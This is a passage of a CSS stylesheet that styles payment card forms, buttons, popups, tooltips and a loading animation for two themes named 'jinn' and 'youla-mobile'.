	font-size: 13px;
	line-height: 17px;
	color: #4d4d4d
}

@media (max-width:420px) {
	.pay-card_type_jinn {
		padding: 15px
	}
}

.pay-card_type_jinn .pay-card__row {
	position: relative;
	padding: 0
}

.pay-card_type_jinn .credit-card-form__label-group_type_add-card,
.pay-card_type_jinn .pay-card__card-selector,
.pay-card_type_jinn .pay-card__remove-card,
.pay-card_type_jinn .pay-card__remove-card-icon,
.pay-card_type_jinn .pay-card__remove-card-text {
	display: none!important
}

.pay-card_type_jinn .pay-card__card {
	width: auto
}

.pay-card_type_jinn .pay-card__card_type_added-card {
	padding-top: 0
}

.pay-card_type_jinn .pay-card__message {
	text-align: left
}

.pay-card_type_jinn .credit-card-form__card-wrapper {
	position: relative
}

.pay-card_type_jinn .credit-card-form__form {
	padding: 0;
	text-align: left
}

.pay-card_type_jinn .credit-card-form__card_position_front {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-orient: vertical;
	-webkit-box-direction: normal;
	-webkit-flex-direction: column;
	flex-direction: column;
	width: auto;
	height: auto;
	margin: 0 auto;
	padding: 30px;
	background: #4a90e2;
	border-radius: 3px;
	-webkit-box-shadow: 5px 5px 20px 0 rgba(0, 0, 0, .2);
	box-shadow: 5px 5px 20px 0 rgba(0, 0, 0, .2)
}

@media (max-width:420px) {
	.pay-card_type_jinn .credit-card-form__card_position_front {
		padding: 11px 15px 15px
	}
}

.pay-card_type_jinn .payment-systems-icons {
	top: 0;
	margin-top: 30px;
	text-align: center
}

@media (max-width:420px) {
	.pay-card_type_jinn .payment-systems-icons {
		margin-top: 20px
	}
}

.pay-card_type_jinn .credit-card-form__card-wrapper .payment-systems-icons {
	display: none
}

.pay-card_type_jinn .payment-systems-icon {
	vertical-align: middle;
	top: 0;
	float: none;
	margin: 0 10px 0 0
}

.pay-card_type_jinn .payment-systems-icon:last-child {
	margin: 0
}

.pay-card_type_jinn .credit-card-form__label-group_type_card-number,
.pay-card_type_jinn .credit-card-form__label-group_type_expiration-date {
	margin: 0 0 20px;
	padding: 0
}

@media (max-width:420px) {
	.pay-card_type_jinn .credit-card-form__label-group_type_card-number,
	.pay-card_type_jinn .credit-card-form__label-group_type_expiration-date {
		margin: 0 0 10px
	}
}

.pay-card_type_jinn .credit-card-form__label-group_type_holder-name {
	-webkit-box-ordinal-group: 2;
	-webkit-order: 1;
	order: 1
}

@media (max-width:420px) {
	.pay-card_type_jinn .credit-card-form__label-group_type_holder-name {
		margin: 0
	}
}

.pay-card_type_jinn .control-label__text,
.pay-card_type_jinn .credit-card-form__title {
	display: block;
	margin: 0 0 10px;
	color: #fff;
	line-height: 17px
}

@media (max-width:420px) {
	.pay-card_type_jinn .control-label__text,
	.pay-card_type_jinn .credit-card-form__title {
		margin: 0 0 5px
	}
}

.pay-card_type_jinn .credit-card-form__input {
	height: 40px;
	color: #4d4d4d;
	background: #fff;
	border-color: transparent;
	border-radius: 3px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 13px;
	padding: 0 10px;
	letter-spacing: .2px
}

@media (max-width:420px) {
	.pay-card_type_jinn .credit-card-form__input {
		height: 30px
	}
}

.pay-card_type_jinn .credit-card-form__input::-webkit-input-placeholder {
	color: gray;
	text-transform: none
}

.pay-card_type_jinn .credit-card-form__input::-moz-placeholder {
	color: gray;
	text-transform: none
}

.pay-card_type_jinn .credit-card-form__input::placeholder {
	color: gray;
	text-transform: none
}

.pay-card_type_jinn .credit-card-form__input[disabled] {
	opacity: .7
}

.pay-card_type_jinn .credit-card-form__input:focus {
	-webkit-box-shadow: none;
	box-shadow: none;
	border-color: transparent
}

.pay-card_type_jinn .credit-card-form__title_type_expiration-date {
	display: none
}

.pay-card_type_jinn .credit-card-form__label-group_type_expiration-date .credit-card-form__label {
	display: inline-block;
	width: 40%;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card_type_jinn .credit-card-form__label-group_type_expiration-date .credit-card-form__input,
.pay-card_type_jinn .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	margin-left: 0;
	width: 100%
}

.pay-card_type_jinn .credit-card-form__label-group_type_expiration-date .credit-card-form__label_type_cvv {
	float: right;
	margin: 0;
	padding: 0
}

.pay-card_type_jinn .credit-card-form__terms {
	margin: 40px 0 0;
	font-size: 15px;
	line-height: 22px;
	-webkit-font-smoothing: antialiased
}

@media (max-width:420px) {
	.pay-card_type_jinn .credit-card-form__terms {
		margin-top: 10px;
		text-align: center
	}
}

.pay-card_type_jinn .credit-card-form__terms-link {
	color: #ff9b00
}

.pay-card_type_jinn .credit-card-form__error-text {
	bottom: 45px;
	color: #fff;
	background: #000;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	padding: 5px 10px;
	margin: 0;
	font-size: 13px;
	z-index: 1;
	-webkit-font-smoothing: antialiased
}

@media (max-width:420px) {
	.pay-card_type_jinn .credit-card-form__error-text {
		bottom: 35px
	}
}

.pay-card_type_jinn .credit-card-form__error-text:before {
	position: absolute;
	bottom: -20px;
	left: 20px;
	border: solid transparent;
	content: "";
	height: 0;
	width: 0;
	pointer-events: none;
	border-top-color: #000;
	border-width: 10px
}

.pay-card_type_jinn .credit-card-form__label_type_cvv .credit-card-form__error-text {
	display: none;
	width: auto;
	margin: 0
}

.pay-card_type_jinn .credit-card-form__label_type_cvv .credit-card-form__title {
	position: relative
}

.pay-card_type_jinn .credit-card-form__label_type_cvv .credit-card-form__input,
.pay-card_type_jinn .credit-card-form__label_type_cvv .credit-card-form__title {
	width: 100%
}

.pay-card_type_jinn .credit-card-form__label {
	position: relative
}

.pay-card_type_jinn .credit-card-form__label_error_yes .credit-card-form__error-text {
	display: block
}

.pay-card_type_jinn .credit-card-form__label_error_yes:after {
	position: absolute;
	bottom: 12px;
	right: 12px;
	width: 17px;
	height: 17px;
	text-align: center;
	display: block;
	content: "!";
	background: #ff2e2e;
	border-radius: 50%;
	font-size: 15px;
	line-height: 17px;
	color: #fff
}

@media (max-width:420px) {
	.pay-card_type_jinn .credit-card-form__label_error_yes:after {
		bottom: 7px;
		right: 7px
	}
}

.pay-card_type_jinn .credit-card-form__label_error_yes .credit-card-form__input {
	outline: none;
	border-color: #ff2e2e
}

.pay-card_type_jinn .credit-card-form__submit {
	width: 50%;
	margin: 40px auto 0
}

@media (max-width:420px) {
	.pay-card_type_jinn .credit-card-form__submit {
		width: auto
	}
}

.pay-card_type_jinn .credit-card-form__popup .button,
.pay-card_type_jinn .credit-card-form__submit .button {
	color: #fff;
	border-radius: 28px;
	width: 100%;
	height: 48px;
	margin: 0;
	line-height: 48px;
	font-size: 15px;
	font-weight: 400
}

.pay-card_type_jinn .credit-card-form__popup .button,
.pay-card_type_jinn .credit-card-form__popup .button:active,
.pay-card_type_jinn .credit-card-form__popup .button:hover,
.pay-card_type_jinn .credit-card-form__submit .button,
.pay-card_type_jinn .credit-card-form__submit .button:active,
.pay-card_type_jinn .credit-card-form__submit .button:hover {
	background: #ff9b00
}

.pay-card_type_jinn .credit-card-form__popup .button:hover,
.pay-card_type_jinn .credit-card-form__submit .button:hover {
	background: #f28a00
}

.pay-card_type_jinn .credit-card-form__popup .button.button_disabled_yes,
.pay-card_type_jinn .credit-card-form__popup .button.button_disabled_yes:active,
.pay-card_type_jinn .credit-card-form__popup .button.button_disabled_yes:hover,
.pay-card_type_jinn .credit-card-form__submit .button.button_disabled_yes,
.pay-card_type_jinn .credit-card-form__submit .button.button_disabled_yes:active,
.pay-card_type_jinn .credit-card-form__submit .button.button_disabled_yes:hover {
	background: #c6c6c6;
	color: #fff;
	cursor: default
}

.pay-card_type_jinn .credit-card-form__popup .button {
	width: auto;
	padding: 0 24px
}

.body_background_jinn .notification-block .title,
.pay-card_type_jinn .credit-card-form__popup .info-block .title {
	margin: 0 0 25px;
	font-size: 20px;
	line-height: 24px;
	color: #2a2a2a
}

.body_background_jinn .info-block .paragraph,
.pay-card_type_jinn .credit-card-form__popup .info-block .paragraph {
	margin: 0 0 35px;
	font-size: 13px;
	line-height: 17px;
	color: #4d4d4d
}

.pay-card_type_jinn .credit-card-form__popup .info-block .paragraph_color_red {
	color: #4d4d4d
}

.pay-card_type_jinn .credit-card-form__popup .notification-block .payment-info-table-wrapper {
	padding: 0 20px;
	background: #fff;
	border-top: 1px solid #ebebeb;
	border-bottom: 1px solid #ebebeb
}

.pay-card_type_jinn .credit-card-form__popup .notification-block .payment-info-table {
	padding: 0;
	border-top: none
}

.pay-card_type_jinn .credit-card-form__popup .notification-block .payment-info-table__caption {
	border-top: none;
	border-bottom: none
}

.pay-card_type_jinn .credit-card-form__popup .notification-block .payment-info-table,
.pay-card_type_jinn .credit-card-form__popup .notification-block .payment-info-table__caption {
	background: #fff
}

.pay-card_type_jinn .credit-card-form__popup .notification-block .payment-info-table__caption,
.pay-card_type_jinn .credit-card-form__popup .notification-block .payment-info-table__head {
	padding: 15px 0;
	font-size: 16px;
	line-height: 24px;
	color: #2a2a2a
}

.pay-card_type_jinn .credit-card-form__popup .notification-block .payment-info-table__head {
	border-top: 1px solid #ebebeb
}

.pay-card_type_jinn .credit-card-form__popup .notification-block .payment-info-table__cell {
	padding: 15px 0;
	font-size: 13px;
	line-height: 17px;
	color: #4d4d4d;
	border-top: 1px solid #ebebeb;
	text-align: right
}

.pay-card_type_jinn .notification-block .payment-info-table {
	background-color: #f1f1f1
}

.pay-card_type_jinn .notification-block .payment-info-table .grid-table__row:last-child .payment-info-table__cell,
.pay-card_type_jinn .notification-block .payment-info-table .grid-table__row:last-child .payment-info-table__head {
	padding-bottom: 15px
}

.secure-information_type_jinn {
	position: relative;
	margin: 40px auto 20px;
	background: none
}

@media (max-width:420px) {
	.secure-information_type_jinn {
		margin: 20px auto
	}
}

.secure-information_type_jinn .secure-information__icon {
	position: absolute;
	left: 20px;
	top: 50%;
	-webkit-filter: hue-rotate(120deg);
	filter: hue-rotate(120deg);
	opacity: .5;
	-webkit-transform: scale(1.4) translateY(-50%);
	-o-transform: scale(1.4) translateY(-50%);
	transform: scale(1.4) translateY(-50%);
	-webkit-transform-origin: 0 0;
	-o-transform-origin: 0 0;
	transform-origin: 0 0
}

@media (max-width:420px) {
	.secure-information_type_jinn .secure-information__icon {
		left: 30px
	}
}

.secure-information_type_jinn .secure-information__text {
	display: inline-block;
	margin: 0 20px;
	padding-left: 40px;
	color: #4d4d4d;
	font-size: 15px;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	-webkit-font-smoothing: antialiased
}

@media (max-width:420px) {
	.secure-information_type_jinn .secure-information__text {
		margin: 0 15px;
		padding-left: 60px
	}
}

.secure-information_type_jinn .secure-information__text_type_protocol {
	display: none
}

.secure-information_type_jinn .secure-information__text_type_secure-connection {
	display: inline-block;
	margin-bottom: 7px
}

.jinn-icon_name_preloader {
	width: 45px;
	height: 30px;
	position: fixed;
	top: 50%;
	left: 50%;
	z-index: 999;
	-webkit-transform: translate3d(-50%, -50%, 0);
	transform: translate3d(-50%, -50%, 0)
}

.jinn-icon_name_preloader:after,
.jinn-icon_name_preloader:before {
	content: "";
	display: block;
	width: 15px;
	height: 15px;
	border-radius: 50%;
	position: absolute;
	top: 50%
}

.jinn-icon_name_preloader:before {
	background-color: #4a90e2;
	left: 50%;
	-webkit-animation: jinn-animation_type_left-ball 1.8s infinite ease-in-out;
	-o-animation: jinn-animation_type_left-ball 1.8s infinite ease-in-out;
	animation: jinn-animation_type_left-ball 1.8s infinite ease-in-out
}

.jinn-icon_name_preloader:after {
	background-color: #ff9b00;
	right: 50%;
	-webkit-animation: jinn-animation_type_right-ball 1.8s infinite ease-in-out;
	-o-animation: jinn-animation_type_right-ball 1.8s infinite ease-in-out;
	animation: jinn-animation_type_right-ball 1.8s infinite ease-in-out
}

@-webkit-keyframes jinn-animation_type_left-ball {
	0%,
	to {
		-webkit-transform: translate3d(50%, -50%, 0);
		transform: translate3d(50%, -50%, 0)
	}
	50% {
		-webkit-transform: translate3d(-150%, -50%, 0);
		transform: translate3d(-150%, -50%, 0)
	}
}

@-o-keyframes jinn-animation_type_left-ball {
	0%,
	to {
		transform: translate3d(50%, -50%, 0)
	}
	50% {
		transform: translate3d(-150%, -50%, 0)
	}
}

@keyframes jinn-animation_type_left-ball {
	0%,
	to {
		-webkit-transform: translate3d(50%, -50%, 0);
		transform: translate3d(50%, -50%, 0)
	}
	50% {
		-webkit-transform: translate3d(-150%, -50%, 0);
		transform: translate3d(-150%, -50%, 0)
	}
}

@-webkit-keyframes jinn-animation_type_right-ball {
	0%,
	to {
		-webkit-transform: translate3d(-50%, -50%, 0);
		transform: translate3d(-50%, -50%, 0)
	}
	50% {
		-webkit-transform: translate3d(150%, -50%, 0);
		transform: translate3d(150%, -50%, 0)
	}
}

@-o-keyframes jinn-animation_type_right-ball {
	0%,
	to {
		transform: translate3d(-50%, -50%, 0)
	}
	50% {
		transform: translate3d(150%, -50%, 0)
	}
}

@keyframes jinn-animation_type_right-ball {
	0%,
	to {
		-webkit-transform: translate3d(-50%, -50%, 0);
		transform: translate3d(-50%, -50%, 0)
	}
	50% {
		-webkit-transform: translate3d(150%, -50%, 0);
		transform: translate3d(150%, -50%, 0)
	}
}

.body_background_youla-mobile,
.pay-card-layout_type_youla-mobile .credit-card-form__popup,
.pay-card-layout_type_youla-mobile .credit-card-form__popup .notification-block {
	background: #f9f9f9
}

.pay-card-layout__order-message_type_youla-mobile,
.pay-card-layout__promo_type_youla-mobile,
.pay-card_type_youla-mobile {
	position: static;
	width: 100%;
	max-width: 360px;
	margin: 0 auto;
	padding: 5px 15px 15px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-family: Roboto, arial, helvetica;
	font-size: 14px;
	line-height: 22px;
	color: #8f8f8f;
	-webkit-font-smoothing: antialiased
}

.pay-card_type_youla-mobile .pay-card__card-selector {
	position: relative;
	width: auto;
	margin: 0
}

.pay-card_type_youla-mobile .pay-card__card-selector.pay-card__card-selector_type_hidden {
	display: none!important
}

.pay-card_type_youla-mobile .pay-card__select-card {
	display: block
}

.pay-card_type_youla-mobile .pay-card__select-card .control {
	margin-right: 0
}

.pay-card_type_youla-mobile .pay-card__select-card .control__select {
	width: 100%;
	height: 48px;
	padding: 7px 12px;
	margin: 0 0 10px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	border-radius: 4px;
	background: #fff;
	font-family: Roboto, arial, helvetica;
	font-size: 16px;
	color: #2a2a2a;
	border-color: #e1e3e5
}

.pay-card_type_youla-mobile .control__select.selectBox-dropdown .selectBox-label {
	padding: 4px 0
}

.pay-card_type_youla-mobile .pay-card__remove-card {
	display: inline-block;
	margin: 0 0 15px;
	color: #00AD64;
	line-height: 18px
}

.pay-card_type_youla-mobile .pay-card__remove-card-icon {
	display: none
}

.pay-card_type_youla-mobile .pay-card__card {
	width: auto
}

.pay-card_type_youla-mobile .pay-card__card_type_added-card {
	padding-top: 0
}

.pay-card_type_youla-mobile .pay-card__card_type_added-card .credit-card-form__label-group_type_add-card {
	display: none
}

.pay-card_type_youla-mobile .pay-card__card_type_added-card .payment-systems-icons {
	top: -85px
}

.pay-card_type_youla-mobile .pay-card__card_type_added-card .payment-systems-icons.pay-card__select-card-payment-systems-icons_themed_yes {
	top: 0
}

.pay-card_type_youla-mobile .pay-card__message {
	margin-bottom: 30px;
	margin-top: 40px;
	vertical-align: middle;
	text-align: center;
	padding: 0;
	width: 100%;
	font-size: 14px;
	color: #333
}

.pay-card_type_youla-mobile .credit-card-form__card-wrapper {
	position: relative
}

.pay-card_type_youla-mobile .credit-card-form__form {
	padding: 0;
	text-align: left
}

.pay-card_type_youla-mobile .credit-card-form__card_position_front {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: auto;
	height: auto;
	margin: 0 auto 10px;
	padding: 0;
	background: none;
	border-radius: 0;
	-webkit-box-shadow: none;
	box-shadow: none;
	position: relative
}

.pay-card_type_youla-mobile .payment-systems-icons {
	position: absolute;
	right: 0;
	top: 3px;
	margin: 0 0 0 5px;
	float: right
}

.pay-card_type_youla-mobile .payment-systems-icons .payment-systems-icon_name_maestro.payment-systems-icon_disabled_yes,
.pay-card_type_youla-mobile .payment-systems-icons .payment-systems-icon_name_mastercard.payment-systems-icon_disabled_yes {
	opacity: 1
}

.pay-card_type_youla-mobile .payment-systems-icons .payment-systems-icon_name_visa {
	top: 0
}

.pay-card_type_youla-mobile .payment-systems-icons .payment-systems-icon_name_visa.payment-systems-icon_disabled_yes {
	opacity: 1
}

.pay-card_type_youla-mobile .payment-systems-icons .payment-systems-icon_name_mir {
	top: 0
}

.pay-card_type_youla-mobile .payment-systems-icons .payment-systems-icon_name_mir.payment-systems-icon_disabled_yes {
	opacity: 1
}

.pay-card_type_youla-mobile .payment-systems-icon.payment-systems-icon_name_mastercard.payment-systems-icon_disabled_yes {
	display: none
}

.pay-card_type_youla-mobile .payment-systems-icon.payment-systems-icon_name_mastercard.payment-systems-icon_disabled_yes+.payment-systems-icon.payment-systems-icon_name_maestro.payment-systems-icon_disabled_yes {
	display: block
}

.pay-card_type_youla-mobile .payment-systems-icon.payment-systems-icon_name_maestro.payment-systems-icon_disabled_yes {
	display: none
}

.pay-card_type_youla-mobile .credit-card-form__label-group_type_card-number {
	clear: both;
	margin: 0 0 15px
}

.pay-card_type_youla-mobile .control-label__text,
.pay-card_type_youla-mobile .credit-card-form__title {
	display: block;
	margin: 0 0 5px;
	text-transform: none;
	font-size: 14px;
	color: #8f8f8f;
	line-height: 1.57
}

.pay-card_type_youla-mobile .credit-card-form__input {
	height: 48px;
	background: #fff;
	border-color: #e1e3e5;
	color: #2a2a2a;
	border-radius: 4px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 16px;
	padding-left: 12px;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_youla-mobile .credit-card-form__input::-webkit-input-placeholder {
	color: #c6c6c6;
	text-transform: none;
	letter-spacing: .5px
}

.pay-card_type_youla-mobile .credit-card-form__input::-moz-placeholder {
	color: #c6c6c6;
	text-transform: none;
	letter-spacing: .5px
}

.pay-card_type_youla-mobile .credit-card-form__input::placeholder {
	color: #c6c6c6;
	text-transform: none;
	letter-spacing: .5px
}

.pay-card_type_youla-mobile .credit-card-form__label-group_type_add-card {
	margin: 0 0 20px
}

.pay-card_type_youla-mobile .credit-card-form__label-group_type_add-card .credit-card-form__label {
	font-size: 14px
}

.pay-card_type_youla-mobile .credit-card-form__label-group_type_add-card .credit-card-form__input {
	display: none
}

.pay-card_type_youla-mobile [type=checkbox]+.credit-card-form__input-icon {
	display: inline-block;
	margin: -3px 10px 0 0;
	padding: 3px;
	vertical-align: top;
	width: 14px;
	height: 14px;
	border: 1px solid #e1e3e5;
	border-radius: 4px;
	background: #fff
}

.pay-card_type_youla-mobile [type=checkbox]:checked+.credit-card-form__input-icon {
	border-color: #e1e3e5
}

.pay-card_type_youla-mobile [type=checkbox]:checked+.credit-card-form__input-icon:after {
	content: "";
	display: block;
	margin: auto;
	width: 5px;
	height: 9px;
	border: solid #00AD64;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(45deg);
	-o-transform: rotate(45deg);
	transform: rotate(45deg)
}

.pay-card_type_youla-mobile .credit-card-form__title_type_expiration-date {
	display: none
}

.pay-card_type_youla-mobile .credit-card-form__label-group_type_expiration-date {
	margin: 0
}

.pay-card_type_youla-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__label {
	width: 50%;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	padding-right: 6px
}

.pay-card_type_youla-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__input,
.pay-card_type_youla-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	margin-left: 0;
	width: 100%
}

.pay-card_type_youla-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__label_type_cvv {
	margin: 0;
	padding: 0 0 0 6px;
	position: relative
}

.pay-card_type_youla-mobile .credit-card-form__cvv-icon,
.pay-card_type_youla-mobile .credit-card-form__cvv-icon:hover,
.pay-card_type_youla-mobile .credit-card-form__label_type_cvv:hover .credit-card-form__cvv-icon {
	height: 20px;
	width: 20px
}

.pay-card_type_youla-mobile .credit-card-form__cvv-icon {
	position: absolute;
	display: inline-block;
	top: 42px;
	left: auto;
	right: 15px;
	border-radius: 10px;
	background-image: none;
	background-color: #ccc;
	text-align: center;
	color: #fff;
	cursor: pointer
}

.pay-card_type_youla-mobile .credit-card-form__cvv-icon:before {
	display: inline-block;
	content: "?";
	font-size: 15px;
	line-height: 15px
}

.pay-card_type_youla-mobile .credit-card-form__terms {
	padding-top: 24px;
	text-align: center;
	font-size: 14px;
	line-height: 22px;
	color: #8f8f8f
}

.pay-card_type_youla-mobile .credit-card-form__terms-link {
	color: #1287c9
}

.pay-card_type_youla-mobile .credit-card-form__error-text,
.pay-card_type_youla-mobile .credit-card-form__label_type_cvv .credit-card-form__error-text {
	display: none
}

.pay-card_type_youla-mobile .credit-card-form__label_type_cvv .credit-card-form__title {
	position: relative
}

.pay-card_type_youla-mobile .credit-card-form__label_type_cvv .credit-card-form__input,
.pay-card_type_youla-mobile .credit-card-form__label_type_cvv .credit-card-form__title {
	width: 100%
}

.pay-card_type_youla-mobile .credit-card-form__label_error_yes .credit-card-form__title {
	color: #f54545
}

.pay-card_type_youla-mobile .credit-card-form__label_error_yes .credit-card-form__input {
	outline: none;
	border: 1px solid #f54545
}

.pay-card-layout_type_youla-mobile .credit-card-form__popup .button,
.pay-card_type_youla-mobile .credit-card-form__submit .button {
	color: #fff;
	border-radius: 3px;
	-webkit-box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .12), 0 0 2px 0 rgba(0, 0, 0, .12);
	box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .12), 0 0 2px 0 rgba(0, 0, 0, .12);
	width: 100%;
	height: 48px;
	margin: 0;
	line-height: 48px;
	font-size: 14px;
	font-weight: 500;
	letter-spacing: .5px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-family: Roboto, arial, helvetica
}

.pay-card-layout_type_youla-mobile .credit-card-form__popup .button,
.pay-card-layout_type_youla-mobile .credit-card-form__popup .button:active,
.pay-card-layout_type_youla-mobile .credit-card-form__popup .button:hover,
.pay-card_type_youla-mobile .credit-card-form__submit .button,
.pay-card_type_youla-mobile .credit-card-form__submit .button:active,
.pay-card_type_youla-mobile .credit-card-form__submit .button:hover {
	background: #00AD64
}

.pay-card-layout_type_youla-mobile .credit-card-form__popup .button {
	width: auto;
	padding: 0 24px
}

.pay-card-layout_type_youla-mobile .credit-card-form__popup .info-block .title,
.pay-card-layout_type_youla-mobile .notification-block .title {
	font-family: Roboto, arial, helvetica;
	margin: 0 0 25px;
	font-size: 20px;
	line-height: 24px;
	color: #2a2a2a
}

.pay-card-layout_type_youla-mobile .credit-card-form__popup .info-block .paragraph,
.pay-card-layout_type_youla-mobile .info-block .paragraph {
	font-family: Roboto, arial, helvetica;
	margin: 0 0 35px;
	font-size: 14px;
	line-height: 1.57;
	color: #8f8f8f
}

.pay-card-layout_type_youla-mobile .credit-card-form__popup .info-block .paragraph_color_red {
	color: #8f8f8f
}

.pay-card-layout_type_youla-mobile .credit-card-form__popup .notification-block .payment-info-table-wrapper {
	padding: 0 20px;
	background: #fff;
	border-top: 1px solid #ebebeb;
	border-bottom: 1px solid #ebebeb
}

.pay-card-layout_type_youla-mobile .credit-card-form__popup .notification-block .payment-info-table {
	padding: 0;
	border-top: none
}

.pay-card-layout_type_youla-mobile .credit-card-form__popup .notification-block .payment-info-table__caption {
	border-top: none;
	border-bottom: none
}

.pay-card-layout_type_youla-mobile .credit-card-form__popup .notification-block .payment-info-table,
.pay-card-layout_type_youla-mobile .credit-card-form__popup .notification-block .payment-info-table__caption {
	background: #fff
}

.pay-card-layout_type_youla-mobile .credit-card-form__popup .notification-block .payment-info-table__caption,
.pay-card-layout_type_youla-mobile .credit-card-form__popup .notification-block .payment-info-table__head {
	padding: 15px 0;
	font-size: 16px;
	line-height: 24px;
	color: #2a2a2a
}

@media screen and (max-width:360px) {
	.pay-card-layout_type_youla-mobile .credit-card-form__popup .notification-block .payment-info-table__caption,
	.pay-card-layout_type_youla-mobile .credit-card-form__popup .notification-block .payment-info-table__head {
		font-size: 14px
	}
}

.pay-card-layout_type_youla-mobile .credit-card-form__popup .notification-block .payment-info-table__head {
	border-top: 1px solid #ebebeb
}

.pay-card-layout_type_youla-mobile .credit-card-form__popup .notification-block .payment-info-table__cell {
	padding: 15px 0;
	font-size: 14px;
	line-height: 22px;
	color: #8f8f8f;
	border-top: 1px solid #ebebeb;
	text-align: right
}

.pay-card_type_youla-mobile .credit-card-form__tooltip {
	left: auto;
	right: 0;
	top: -60px;
	width: 200px;
	padding: 15px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	color: #fff;
	background-color: rgba(73, 73, 73, .9);
	-webkit-box-shadow: 0 2px 2px .3px rgba(0, 0, 0, .04), 0 0 1px 0 rgba(0, 0, 0, .12);
	box-shadow: 0 2px 2px .3px rgba(0, 0, 0, .04), 0 0 1px 0 rgba(0, 0, 0, .12);
	border-radius: 4px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 14px;
	line-height: 22px;
	text-align: left;
	white-space: normal
}

.pay-card_type_youla-mobile .credit-card-form__tooltip-arrow {
	bottom: -16px;
	right: 17px;
	border: solid transparent;
	content: "";
	height: 0;
	width: 0;
	pointer-events: none;
	border-top-color: rgba(73, 73, 73, .9);
	border-width: 8px;
	margin-left: 0
}

.pay-card_type_youla-mobile .credit-card-form__tooltip_type_cvv .credit-card-form__tooltip-icon {
	display: none
}

.pay-card_type_youla-mobile .notification-block .payment-info-table__caption {
	padding: 10px 0;
	border-bottom: 1px solid hsla(0, 0%, 59%, .4);
	background-color: #f1f1f1
}

.pay-card_type_youla-mobile .notification-block .payment-info-table {
	background-color: #f1f1f1
}

.pay-card_type_youla-mobile .notification-block .payment-info-table__caption,
.pay-card_type_youla-mobile .notification-block .payment-info-table__cell,
.pay-card_type_youla-mobile .notification-block .payment-info-table__head {
	font-size: 14px;
	color: rgba(0, 0, 0, .5);
	letter-spacing: -.3px
}

.pay-card_type_youla-mobile .notification-block .payment-info-table .grid-table__row:last-child .payment-info-table__cell,
.pay-card_type_youla-mobile .notification-block .payment-info-table .grid-table__row:last-child .payment-info-table__head {
	padding-bottom: 15px
}

select.control__select_type_youla-mobile {
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.control__select_type_youla-mobile-selectBox-dropdown-menu.selectBox-options li a {
	line-height: 40px;
	padding: 0 14px;
	font-size: 16px
}

.control__select_type_youla-mobile-selectBox-dropdown-menu.selectBox-options li.selectBox-selected a:hover,
.control__select_type_youla-mobile-selectBox-dropdown-menu.selectBox-options li a:hover {
	background: #f5f5f5
}

.control__select_type_youla-mobile-selectBox-dropdown-menu.selectBox-options li.selectBox-selected a {
	color: #00AD64;
	background: none
}

.control__select_type_youla-mobile-selectBox-dropdown-menu {
	border: 1px solid #e9e9e9;
	border-bottom-right-radius: 2px;
	border-bottom-left-radius: 2px
}

.control__select_type_youla-mobile-selectBox-dropdown-menu li:last-child {
	border-top: 1px solid #e9e9e9!important
}

.pay-card_type_youla-mobile .control__select {
	width: 100%!important
}

.pay-card_type_youla-mobile .selectBox-arrow {
	display: block!important;
	right: 15px!important;
	width: 13px!important;
	height: 7px!important;
	border: none!important;
	background: none!important;
	font-family: tahoma
}

.pay-card_type_youla-mobile .selectBox-arrow:before {
	margin-top: -13px
}

.pay-card_type_youla-mobile .pay-card__card-selector:before,
.pay-card_type_youla-mobile .selectBox-arrow:before {
	content: "\203A";
	display: block;
	-webkit-transform: rotate(90deg);
	-o-transform: rotate(90deg);
	transform: rotate(90deg);
	font-size: 24px;
	color: #ccc
}

.pay-card_type_youla-mobile .pay-card__card-selector:before {
	position: absolute;
	top: 48px;
	right: 8px;
	width: 13px;
	height: 7px;
	background: none;
	font-family: tahoma;
	pointer-events: none
}

.pay-card_type_youla-mobile .selectBox-menuShowing .selectBox-arrow:before {
	content: "\2039"
}

.secure-information_type_youla-mobile {
	max-width: 360px;
	margin: 0 auto;
	padding: 0 15px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background: none
}

.secure-information_type_youla-mobile .secure-information__icon {
	margin: 0
}

.secure-information_type_youla-mobile .secure-information__text {
	padding-left: 23px;
	margin: 0;
	font-size: 14px;
	font-family: Roboto, arial, helvetica;
	line-height: 22px;
	font-weight: 300;
	color: #8f8f8f;
	-webkit-font-smoothing: antialiased
}

.secure-information_type_youla-mobile .secure-information__text_type_protocol {
	display: inline-block;
	margin: 0 5px 0 0
}

.pay-card-layout__promo_type_youla-mobile {
	margin-bottom: 0;
	padding-bottom: 5px
}

.pay-card-layout__promo_type_youla-mobile .pay-card-layout__promo-columns {
	display: table;
	width: 100%;
	border: 1px solid #6baa71;
	border-radius: 4px;
	background: #f1fff2
}

.pay-card-layout__promo_type_youla-mobile .pay-card-layout__promo-column {
	display: table-cell
}

.pay-card-layout__promo_type_youla-mobile .pay-card-layout__promo-column_type_left,
.pay-card-layout__promo_type_youla-mobile .pay-card-layout__promo-column_type_right {
	padding: 10px;
	vertical-align: middle
}

.pay-card-layout__promo_type_youla-mobile .pay-card-layout__promo-column_type_left {
	width: 1%
}

